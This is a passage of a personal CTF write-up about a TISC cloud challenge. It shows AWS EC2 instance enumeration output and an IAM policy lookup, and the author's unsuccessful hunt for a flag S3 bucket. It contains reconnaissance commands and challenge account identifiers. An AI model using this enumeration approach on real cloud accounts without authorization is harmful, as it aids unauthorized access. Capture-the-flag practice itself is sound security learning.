            "UsageOperation": "RunInstances",
            "UsageOperationUpdateTime": "Fri, 21 Jul 2023 15:05:29",
            "PrivateDnsNameOptions": {
                "HostnameType": "ip-name"
            },
            "MaintenanceOptions": {
                "AutoRecovery": "default"
            },
            "CurrentInstanceBootMode": "legacy-bios",
            "Region": "ap-southeast-1"
        },
        {
            "ImageId": "ami-0df7a207adb9748c7",
            "InstanceId": "i-02423bae26b4cfd9a",
            "InstanceType": "t3a.small",
            "LaunchTime": "Sat, 16 Sep 2023 07:06:20",
            "Monitoring": {
                "State": "disabled"
            },
            "Placement": {
                "AvailabilityZone": "ap-southeast-1a",
                "Tenancy": "default"
            },
            "PrivateDnsName": "ip-192-168-0-172.ap-southeast-1.compute.internal",
            "PrivateIpAddress": "192.168.0.172",
            "PublicDnsName": "ec2-13-213-29-24.ap-southeast-1.compute.amazonaws.com",
            "PublicIpAddress": "13.213.29.24",
            "State": {
                "Code": 16,
                "Name": "running"
            },
            "SubnetId": "subnet-0e7baa8cdf3a7fd1b",
            "VpcId": "vpc-063e577d022d3fa3b",
            "Architecture": "x86_64",
            "BlockDeviceMappings": [
                {
                    "DeviceName": "/dev/sda1",
                    "Ebs": {
                        "AttachTime": "Sat, 16 Sep 2023 07:06:20",
                        "DeleteOnTermination": true,
                        "Status": "attached",
                        "VolumeId": "vol-0429e09162524aa33"
                    }
                }
            ],
            "ClientToken": "terraform-20230916070619552900000001",
            "EnaSupport": true,
            "Hypervisor": "xen",
            "NetworkInterfaces": [
                {
                    "Association": {
                        "IpOwnerId": "amazon",
                        "PublicDnsName": "ec2-13-213-29-24.ap-southeast-1.compute.amazonaws.com",
                        "PublicIp": "13.213.29.24"
                    },
                    "Attachment": {
                        "AttachTime": "Sat, 16 Sep 2023 07:06:20",
                        "AttachmentId": "eni-attach-01bc5e45e2c2c672f",
                        "DeleteOnTermination": true,
                        "Status": "attached"
                    },
                    "Groups": [
                        {
                            "GroupName": "Generic network for staging and production",
                            "GroupId": "sg-0c178b9e55483a8da"
                        }
                    ],
                    "MacAddress": "02:e5:c1:c3:47:20",
                    "NetworkInterfaceId": "eni-05a6609c4a1cd826d",
                    "OwnerId": "232705437403",
                    "PrivateDnsName": "ip-192-168-0-172.ap-southeast-1.compute.internal",
                    "PrivateIpAddress": "192.168.0.172",
                    "PrivateIpAddresses": [
                        {
                            "Association": {
                                "IpOwnerId": "amazon",
                                "PublicDnsName": "ec2-13-213-29-24.ap-southeast-1.compute.amazonaws.com",
                                "PublicIp": "13.213.29.24"
                            },
                            "Primary": true,
                            "PrivateDnsName": "ip-192-168-0-172.ap-southeast-1.compute.internal",
                            "PrivateIpAddress": "192.168.0.172"
                        }
                    ],
                    "SourceDestCheck": true,
                    "Status": "in-use",
                    "SubnetId": "subnet-0e7baa8cdf3a7fd1b",
                    "VpcId": "vpc-063e577d022d3fa3b",
                    "InterfaceType": "interface"
                }
            ],
            "RootDeviceName": "/dev/sda1",
            "RootDeviceType": "ebs",
            "SecurityGroups": [
                {
                    "GroupName": "Generic network for staging and production",
                    "GroupId": "sg-0c178b9e55483a8da"
                }
            ],
            "SourceDestCheck": true,
            "VirtualizationType": "hvm",
            "CpuOptions": {
                "CoreCount": 1,
                "ThreadsPerCore": 2
            },
            "CapacityReservationSpecification": {
                "CapacityReservationPreference": "open"
            },
            "MetadataOptions": {
                "State": "applied",
                "HttpTokens": "optional",
                "HttpPutResponseHopLimit": 1,
                "HttpEndpoint": "enabled",
                "HttpProtocolIpv6": "disabled",
                "InstanceMetadataTags": "disabled"
            },
            "PlatformDetails": "Linux/UNIX",
            "UsageOperation": "RunInstances",
            "UsageOperationUpdateTime": "Sat, 16 Sep 2023 07:06:20",
            "PrivateDnsNameOptions": {
                "HostnameType": "ip-name"
            },
            "MaintenanceOptions": {
                "AutoRecovery": "default"
            },
            "CurrentInstanceBootMode": "legacy-bios",
            "Region": "ap-southeast-1"
        }
    ]
}
Account: {
    "account_id": "232705437403",
    "account_iam_alias": "<NotFound>",
    "account_total_spend": "<unauthorized>",
    "org_data": {
        "error": "Not Authorized to get Organization Data"
    }
}
```

At the same time, I also had a rough idea that flag2 was related to EC2, as in my previous enumeration, i also found related snippets for flag2 when enumerating policies. Which also gave me the rough direction: i had to somehow get access to the `devsecmeow2023flag2` bucket. (which is likely accessible from 54.255.155.134)

`aws iam get-policy-version --policy-arn arn:aws:iam::232705437403:policy/iam_policy_for_ec2_production_role --version-id v1`

```python
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": [
                        "s3:GetObject"
                    ],
                    "Effect": "Allow",
                    "Resource": [
                        "arn:aws:s3:::devsecmeow2023flag2/index.html"
                    ],
                    "Sid": "VisualEditor0"
                }
            ],
            "Version": "2012-10-17"
        },
        "VersionId": "v1",
        "IsDefaultVersion": true,
        "CreateDate": "2023-07-21T15:05:07+00:00"
    }
}
```

At this point, i was trying many different stuffs (which didn’t work ofc, as i only solved till level 6) and lots of enumeration. Unfortunately i wasn’t able to continue further from here.. Enumeration was probably lacking? I was also studying for OSCP and school, so after a day or two of trying without any further progress, I decided to call it quits on the CTF as i had to focus on other things. The challenge server is already down, so looking to read writeups from others on how they solved part 2!

Overall, I learnt quite alot from the challenges! Fun CTF and hopefully would be able to do better if i do participate in the future editions of TISC.
